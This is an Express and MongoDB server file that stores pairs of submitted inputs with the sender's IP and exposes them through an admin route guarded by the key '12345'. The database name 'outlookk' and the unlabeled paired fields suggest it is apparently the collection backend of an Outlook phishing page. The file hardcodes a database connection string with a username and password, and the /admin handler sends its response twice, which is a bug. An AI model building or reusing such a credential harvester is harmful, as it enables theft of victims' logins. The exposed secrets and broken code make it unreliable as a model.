// ✅ FULL BACKEND (Express + MongoDB + Admin Dashboard with Secret Key)

const express = require("express");
const cors = require("cors");
const { MongoClient, ObjectId } = require("mongodb");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 5000;

// 🔧 MongoDB settings (provided by user)
const mongoUri =
  "mongodb+srv://Behindsomto:Omemma07@cluster0.gbjam7k.mongodb.net/userdb?retryWrites=true&w=majority&appName=Cluster0";
const dbName = "outlookk";
const collectionName = "inputs";
const secretKey = "12345"; // change to something stronger

app.use(cors());
app.use(express.json());

let db, collection;

// ✅ Connect to MongoDB
MongoClient.connect(mongoUri, { useUnifiedTopology: true })
  .then((client) => {
    db = client.db(dbName);
    collection = db.collection(collectionName);
    console.log("✅ Connected to MongoDB");
  })
  .catch((err) => console.error("❌ MongoDB connection error:", err));

// ✅ Save submission route
app.post("/submit", async (req, res) => {
  try {
    const { input1, input2 } = req.body;
    if (!input1 || !input2)
      return res.status(400).json({ error: "Missing input" });

    const newEntry = {
      input1,
      input2,
      createdAt: new Date(),
      ip: req.ip,
    };

    await collection.insertOne(newEntry);
    res.status(200).json({ message: "Stored successfully" });
  } catch (err) {
    console.error("Submit error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ Admin route to fetch all data
app.get("/admin", async (req, res) => {
  try {
    const key = req.query.key;
    if (key !== secretKey)
      return res.status(401).json({ error: "Unauthorized" });

    const data = await collection.find({}).sort({ createdAt: -1 }).toArray();

    // ✅ Convert _id to string format
    const cleanData = data.map((d) => ({
      ...d,
      _id: d._id.toString(),
    }));

    res.json(cleanData);

    res.json(data);
  } catch (err) {
    console.error("Admin fetch error:", err);
    res.status(500).json({ error: "Internal error" });
  }
});

// ✅ Admin delete by ID
app.delete("/admin/:id", async (req, res) => {
  const { id } = req.params;
  const key = req.query.key;
  if (key !== secretKey) return res.status(401).json({ error: "Unauthorized" });

  try {
    const result = await collection.deleteOne({ _id: new ObjectId(id) });
    res.json({ deleted: result.deletedCount });
  } catch (err) {
    console.error("Delete error:", err);
    res.status(500).json({ error: "Failed to delete" });
  }
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
